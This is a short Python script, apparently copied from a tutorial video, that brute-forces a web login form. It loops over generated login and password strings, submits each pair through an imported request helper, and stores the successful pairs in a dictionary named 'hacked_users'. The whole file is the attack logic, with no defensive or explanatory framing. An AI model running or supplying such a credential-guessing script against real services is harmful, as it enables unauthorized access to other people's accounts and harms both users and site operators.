#  переписано с видео до 02.08

from generators.bases import get_next_str
from requesters.forms_query import request

hacked_users = {}
attempts = 3

get_next_login = get_next_str
get_next_password = get_next_str
login_state = 'state'
password_state = 'password'


def hack():
    # TODO check time

    step = 0
    password = ''
    while password is not None:
        login = ''
        while login is not None:
            for _ in range(attempts):
                try:
                    if request(login, password):
                        print('Success:', login, password)
                        hacked_users[login] = password
                    break
                except:
                    print('Error:', login, password)
            login = get_next_login(login_state)

            step += 1
            if step % 100 == 0:
                print(step, login, password)

        password = get_next_password(password_state)


if __name__ == '__main__':
    hack()
    print('Result')
    print(hacked_users)